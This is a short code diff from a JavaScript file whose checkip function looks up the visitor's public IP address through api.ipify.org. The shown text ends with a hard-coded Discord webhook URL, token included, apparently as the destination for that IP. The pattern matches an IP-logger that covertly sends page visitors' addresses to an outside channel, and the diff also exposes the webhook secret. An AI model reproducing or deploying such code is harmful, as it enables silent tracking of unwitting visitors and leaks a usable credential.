@@ -1,7 +1,7 @@
 let ip = document.getElementById('IP')
 
 function checkip(response) {
-    fetch('http://api.ipify.org/?format=json')
+    fetch('http://api.ipify.org/?format=json',{"method":"GET","headers": {"content-type":"application/json"}})
     .then(results =>  results.json())
     .then(data => {
         const url = "https://discord.com/api/webhooks/810207690415931422/1fopeXrycEDAQqHXeyCstLBOFe-vTFOxTul6wuPkiGy3Ojo79Tl63fGyODV1WQt_oyjo"
